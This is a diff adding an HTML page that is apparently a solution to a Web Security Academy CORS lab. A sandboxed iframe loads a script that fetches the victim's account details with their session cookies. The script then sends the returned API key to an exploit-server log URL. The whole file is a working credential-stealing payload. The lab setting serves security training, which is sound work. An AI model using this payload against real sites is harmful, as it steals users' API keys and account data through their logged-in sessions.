@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Hello</h1>
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+      fetch('https://0a2700a303459e7a8283528a00b300cf.web-security-academy.net/accountDetails', {
+        method: 'GET',
+        credentials: 'include'
+      })
+      .then(response => {
+        return response.json();
+      })
+      .then(body => {
+        location = 'https://exploit-0aa4007803249e8b823b51820119006d.exploit-server.net/log?key=' + body.apikey;
+      })
+      </script>"></iframe>
+  </body>
+</html>
